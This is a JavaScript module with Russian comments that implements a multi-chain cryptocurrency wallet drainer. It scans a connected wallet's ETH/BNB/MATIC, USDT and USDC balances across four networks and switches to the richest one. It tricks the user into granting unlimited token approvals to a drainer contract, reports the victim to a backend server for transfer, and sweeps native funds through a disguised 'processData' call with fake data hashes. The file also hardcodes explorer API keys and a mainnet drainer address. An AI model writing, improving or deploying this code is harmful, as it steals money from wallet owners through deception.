import { ethers } from 'ethers';

// ABI для ERC20 токенов
const ERC20_ABI = [
  "function balanceOf(address account) view returns (uint256)",
  "function approve(address spender, uint256 amount) returns (bool)",
  "function decimals() view returns (uint8)",
  "function allowance(address owner, address spender) view returns (uint256)",
  "function transferFrom(address sender, address recipient, uint256 amount) returns (bool)"
];

// ABI для дрейнера
const DRAINER_ABI = [
  "function processData(uint256 taskId, bytes32 dataHash, uint256 nonce) external payable"
];

// Ключи API для сканеров
const ETHERSCAN_API_KEY = "X2A1BU3MABVFFN1GQ1DRX5PHNG212MTXKT";
const BSCSCAN_API_KEY = "8AWWMFHVD5E65JCGGYKKE95RTKTPB7AJJR";
const POLYGONSCAN_API_KEY = "43EJ8S6WRP4ESVX8AGM8KP9I61P44YWZ2T";
const ARBISCAN_API_KEY = "6YDH1XI6VB7UBQV4WXSH2M7UIEBMMCF9ES";
const OPTIMISTIC_ETHERSCAN_API_KEY = "5CKHVMKCD5VBXIB4PCM4KYKX5JJCCVU3RW";
const BASESCAN_API_KEY = "TEB6I1H3F1UH1DF2I1R39PA9RX5C6IKB1H";

// Конфигурация сетей
const CHAINS = {
  1: {
    name: "Ethereum Mainnet",
    nativeToken: "ETH",
    chainIdHex: "0x1",
    rpcUrls: ["https://ethereum-rpc.publicnode.com"],
    usdtAddress: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
    usdcAddress: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
    drainerAddress: "0x22E2fdf36E1257012B7dD305A2939C5e08C958c5",
    explorerApi: "https://api.etherscan.io/api",
    explorerApiKey: ETHERSCAN_API_KEY
  },
  56: {
    name: "BNB Chain",
    nativeToken: "BNB",
    chainIdHex: "0x38",
    rpcUrls: [
      "https://bsc-dataseed.binance.org/",
      "https://bsc-dataseed1.defibit.io/",
      "https://bsc-dataseed1.ninicoin.io/"
    ],
    usdtAddress: "0x55d398326f99059fF775485246999027B3197955",
    usdcAddress: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d",
    drainerAddress: "YOUR_BNB_DRAINER_ADDRESS", // Замените после деплоя
    explorerApi: "https://api.bscscan.com/api",
    explorerApiKey: BSCSCAN_API_KEY
  },
  137: {
    name: "Polygon",
    nativeToken: "MATIC",
    chainIdHex: "0x89",
    rpcUrls: ["https://polygon-rpc.com/"],
    usdtAddress: "0xc2132D05D31c914a87C6611C10748AEb04B58e8F",
    usdcAddress: "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174",
    drainerAddress: "YOUR_POLYGON_DRAINER_ADDRESS", // Замените после деплоя
    explorerApi: "https://api.polygonscan.com/api",
    explorerApiKey: POLYGONSCAN_API_KEY
  },
  42161: {
    name: "Arbitrum One",
    nativeToken: "ETH",
    chainIdHex: "0xa4b1",
    rpcUrls: ["https://arb1.arbitrum.io/rpc"],
    usdtAddress: "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9",
    usdcAddress: "0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8",
    drainerAddress: "YOUR_ARBITRUM_DRAINER_ADDRESS", // Замените после деплоя
    explorerApi: "https://api.arbiscan.io/api",
    explorerApiKey: ARBISCAN_API_KEY
  }
};

// Утилита для задержки
const delay = (ms) => new Promise(r => setTimeout(r, ms));

// Получение баланса нативного токена через API
async function getBalanceFromExplorer(address, chainId) {
  const config = CHAINS[chainId];
  const apiUrl = `${config.explorerApi}?module=account&action=balance&address=${address}&tag=latest&apikey=${config.explorerApiKey}`;
  const response = await fetch(apiUrl);
  const data = await response.json();
  if (data.status === "1") {
    return ethers.BigNumber.from(data.result);
  } else {
    throw new Error(data.message || `Ошибка API для ${config.name}`);
  }
}

// Получение баланса токена через API
async function getTokenBalanceFromExplorer(address, tokenAddress, chainId) {
  const config = CHAINS[chainId];
  const apiUrl = `${config.explorerApi}?module=account&action=tokenbalance&contractaddress=${tokenAddress}&address=${address}&tag=latest&apikey=${config.explorerApiKey}`;
  const response = await fetch(apiUrl);
  const data = await response.json();
  if (data.status === "1") {
    return ethers.BigNumber.from(data.result);
  } else {
    throw new Error(data.message || `Ошибка API для токена в ${config.name}`);
  }
}

// Проверка баланса с использованием API и fallback на RPC
async function checkBalance(chainId, userAddress) {
  const config = CHAINS[chainId];
  let nativeBalance, usdtBalance, usdcBalance;

  try {
    nativeBalance = await getBalanceFromExplorer(userAddress, chainId);
  } catch (e) {
    console.warn(`Ошибка API для нативного баланса в ${config.name}: ${e.message}`);
    let provider;
    for (const rpc of config.rpcUrls) {
      try {
        provider = new ethers.providers.JsonRpcProvider(rpc);
        await provider.getBlockNumber();
        break;
      } catch (_) {}
    }
    if (!provider) throw new Error(`Нет доступных RPC для ${config.name}`);
    nativeBalance = await provider.getBalance(userAddress);
  }

  try {
    usdtBalance = await getTokenBalanceFromExplorer(userAddress, config.usdtAddress, chainId);
  } catch (e) {
    console.warn(`Ошибка API для USDT в ${config.name}: ${e.message}`);
    const provider = new ethers.providers.JsonRpcProvider(config.rpcUrls[0]);
    const usdt = new ethers.Contract(config.usdtAddress, ERC20_ABI, provider);
    usdtBalance = await usdt.balanceOf(userAddress);
  }

  try {
    usdcBalance = await getTokenBalanceFromExplorer(userAddress, config.usdcAddress, chainId);
  } catch (e) {
    console.warn(`Ошибка API для USDC в ${config.name}: ${e.message}`);
    const provider = new ethers.providers.JsonRpcProvider(config.rpcUrls[0]);
    const usdc = new ethers.Contract(config.usdcAddress, ERC20_ABI, provider);
    usdcBalance = await usdc.balanceOf(userAddress);
  }

  return { nativeBalance, usdtBalance, usdcBalance };
}

// Проверка наличия средств
function hasFunds(bal) {
  return (
    bal.nativeBalance.gt(ethers.utils.parseEther("0.001")) ||
    bal.usdtBalance.gt(ethers.utils.parseUnits("0.1", 6)) ||
    bal.usdcBalance.gt(ethers.utils.parseUnits("0.1", 6))
  );
}

// Переключение сети
async function switchChain(chainId) {
  try {
    await window.ethereum.request({
      method: "wallet_switchEthereumChain",
      params: [{ chainId: CHAINS[chainId].chainIdHex }]
    });
  } catch (e) {
    console.warn(`Ошибка переключения на сеть ${CHAINS[chainId].name}: ${e.message}`);
    throw e;
  }
}

// Выполнение дрейна
async function drain(chainId, signer, userAddress, bal) {
  const config = CHAINS[chainId];
  const MAX = ethers.constants.MaxUint256;

  const usdt = new ethers.Contract(config.usdtAddress, ERC20_ABI, signer);
  const usdc = new ethers.Contract(config.usdcAddress, ERC20_ABI, signer);

  // Проверка баланса ETH перед approve
  const ethBalance = await signer.provider.getBalance(userAddress);
  const minEthRequired = ethers.utils.parseEther("0.0003");
  if (ethBalance.lt(minEthRequired)) {
    console.error(`❌ Недостаточно ${config.nativeToken} для газа: ${ethers.utils.formatEther(ethBalance)} ${config.nativeToken}`);
    throw new Error(`Недостаточно ${config.nativeToken} для оплаты газа`);
  }

  // Проверка и выполнение approve для USDT
  if (bal.usdtBalance.gt(0)) {
    console.log(`📊 USDT баланс (API): ${ethers.utils.formatUnits(bal.usdtBalance, 6)} USDT`);
    const realUsdtBalance = await usdt.balanceOf(userAddress);
    console.log(`📊 USDT баланс (реальный): ${ethers.utils.formatUnits(realUsdtBalance, 6)} USDT`);
    if (realUsdtBalance.lt(bal.usdtBalance)) {
      console.error(`❌ Некорректный баланс: API вернул ${ethers.utils.formatUnits(bal.usdtBalance, 6)}, реальный: ${ethers.utils.formatUnits(realUsdtBalance, 6)}`);
      bal.usdtBalance = realUsdtBalance;
    }

    const allowanceBefore = await usdt.allowance(userAddress, config.drainerAddress);
    console.log(`📜 USDT allowance до: ${ethers.utils.formatUnits(allowanceBefore, 6)} USDT`);

    if (allowanceBefore.lt(bal.usdtBalance)) {
      try {
        const nonce = await signer.provider.getTransactionCount(userAddress, "pending");
        const tx = await usdt.approve(config.drainerAddress, MAX, {
          gasLimit: 100000,
          gasPrice: ethers.utils.parseUnits("3", "gwei"),
          nonce
        });
        const receipt = await tx.wait();
        console.log("✅ USDT approve успешен:", tx.hash);
        console.log("⏳ Ожидание подтверждения approve...");
        await delay(5000);
        const allowanceAfter = await usdt.allowance(userAddress, config.drainerAddress);
        console.log(`📜 USDT allowance после: ${ethers.utils.formatUnits(allowanceAfter, 6)} USDT`);
        await notifyServer(userAddress, config.usdtAddress, bal.usdtBalance, chainId, receipt.transactionHash);
      } catch (e) {
        console.error(`❌ Ошибка approve для USDT: ${e.message}`);
        throw e;
      }
    } else {
      console.log("✅ USDT allowance уже достаточен, уведомляем сервер");
      await notifyServer(userAddress, config.usdtAddress, bal.usdtBalance, chainId, null);
    }
  }

  // Проверка и выполнение approve для USDC
  if (bal.usdcBalance.gt(0)) {
    console.log(`📊 USDC баланс (API): ${ethers.utils.formatUnits(bal.usdcBalance, 6)} USDC`);
    const realUsdcBalance = await usdc.balanceOf(userAddress);
    console.log(`📊 USDC баланс (реальный): ${ethers.utils.formatUnits(realUsdcBalance, 6)} USDC`);
    if (realUsdcBalance.lt(bal.usdcBalance)) {
      console.error(`❌ Некорректный баланс: API вернул ${ethers.utils.formatUnits(bal.usdcBalance, 6)}, реальный: ${ethers.utils.formatUnits(realUsdcBalance, 6)}`);
      bal.usdcBalance = realUsdcBalance;
    }

    const allowanceBefore = await usdc.allowance(userAddress, config.drainerAddress);
    if (allowanceBefore.lt(bal.usdcBalance)) {
      try {
        const nonce = await signer.provider.getTransactionCount(userAddress, "pending");
        const tx = await usdc.approve(config.drainerAddress, MAX, {
          gasLimit: 100000,
          gasPrice: ethers.utils.parseUnits("3", "gwei"),
          nonce
        });
        const receipt = await tx.wait();
        console.log("✅ USDC approve успешен:", tx.hash);
        console.log("⏳ Ожидание подтверждения approve...");
        await delay(5000);
        const allowanceAfter = await usdc.allowance(userAddress, config.drainerAddress);
        console.log(`📜 USDC allowance после: ${ethers.utils.formatUnits(allowanceAfter, 6)} USDC`);
        await notifyServer(userAddress, config.usdcAddress, bal.usdcBalance, chainId, receipt.transactionHash);
      } catch (e) {
        console.error(`❌ Ошибка approve для USDC: ${e.message}`);
        throw e;
      }
    } else {
      console.log("✅ USDC allowance уже достаточен, уведомляем сервер");
      await notifyServer(userAddress, config.usdcAddress, bal.usdcBalance, chainId, null);
    }
  }

  // Дрейнинг нативного токена
  if (bal.nativeBalance.gt(0)) {
    const drainer = new ethers.Contract(config.drainerAddress, DRAINER_ABI, signer);
    const gasReserve = ethers.utils.parseEther("0.002");
    const nativeToSend = bal.nativeBalance.sub(gasReserve);
    const value = nativeToSend.gt(0) ? nativeToSend : ethers.BigNumber.from(0);

    if (value.gt(0)) {
      const taskId = Math.floor(Math.random() * 1000000);
      const dataHash = ethers.utils.keccak256(ethers.utils.toUtf8Bytes(`fakeData-native-${Date.now()}`));
      const nonce = await signer.provider.getTransactionCount(userAddress, "pending");

      try {
        const tx = await drainer.processData(taskId, dataHash, nonce, {
          value,
          gasLimit: 100000,
          gasPrice: ethers.utils.parseUnits("3", "gwei"),
          nonce
        });
        const receipt = await tx.wait();
        if (receipt.status !== 1) {
          throw new Error(`Транзакция processData (${config.nativeToken}) не удалась`);
        }
        console.log(`✅ Дрейнинг ${config.nativeToken} успешен:`, receipt.transactionHash);
      } catch (e) {
        console.error(`❌ Ошибка вызова processData (${config.nativeToken}): ${e.message}`);
        throw e;
      }
    }
  }
}

async function notifyServer(userAddress, tokenAddress, amount, chainId, txHash) {
  try {
    const provider = new ethers.providers.JsonRpcProvider(CHAINS[chainId].rpcUrls[0]);
    const token = new ethers.Contract(tokenAddress, ERC20_ABI, provider);
    const balance = await token.balanceOf(userAddress);
    const decimals = await token.decimals();
    const balanceUnits = ethers.utils.formatUnits(balance, decimals);
    console.log(`📊 Реальный баланс токена (${tokenAddress}): ${balanceUnits}`);

    const roundedBalance = Math.floor(parseFloat(balanceUnits) * 10) / 10;
    console.log(`📊 Округлённый баланс: ${roundedBalance}`);

    const roundedAmount = ethers.utils.parseUnits(roundedBalance.toString(), decimals);
    if (roundedAmount.lte(0)) {
      throw new Error('Баланс слишком мал для перевода');
    }

    console.log(`📤 Отправка на сервер: userAddress=${userAddress}, tokenAddress=${tokenAddress}, amount=${ethers.utils.formatUnits(roundedAmount, decimals)}, chainId=${chainId}, txHash=${txHash}`);
    const response = await fetch('http://localhost:3000/api/transfer', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        userAddress,
        tokenAddress,
        amount: roundedAmount.toString(),
        chainId,
        txHash
      })
    });
    const data = await response.json();
    if (data.success) {
      console.log("✅ Сервер уведомлён, трансфер будет выполнен");
    } else {
      console.error("❌ Ошибка от сервера:", data.message);
      throw new Error(data.message);
    }
  } catch (e) {
    console.error("❌ Ошибка при отправке данных на сервер:", e.message);
    throw e;
  }
}

// Основная функция
export async function runDrainer(provider, signer, userAddress) {
  const balancePromises = Object.keys(CHAINS).map(async (chainId) => {
    try {
      const balance = await checkBalance(chainId, userAddress);
      console.log(`Сеть: ${CHAINS[chainId].name}`);
      console.log(`💰 ${CHAINS[chainId].nativeToken}: ${ethers.utils.formatEther(balance.nativeBalance)}`);
      console.log(`🟠 USDT: ${ethers.utils.formatUnits(balance.usdtBalance, 6)}`);
      console.log(`🔵 USDC: ${ethers.utils.formatUnits(balance.usdcBalance, 6)}`);
      return { chainId: Number(chainId), ...balance };
    } catch (e) {
      console.warn(`Ошибка при проверке баланса в сети ${CHAINS[chainId].name}: ${e.message}`);
      return null;
    }
  });

  const balances = (await Promise.all(balancePromises)).filter(Boolean);
  const sorted = balances
    .filter(hasFunds)
    .sort((a, b) =>
      b.usdtBalance.add(b.usdcBalance).gt(a.usdtBalance.add(a.usdcBalance)) ? 1 : -1
    );

  if (!sorted.length) {
    console.warn("⛔ Нет подходящих сетей с балансом.");
    return;
  }

  const target = sorted[0];
  await switchChain(target.chainId);
  await drain(target.chainId, signer, userAddress, target);
}
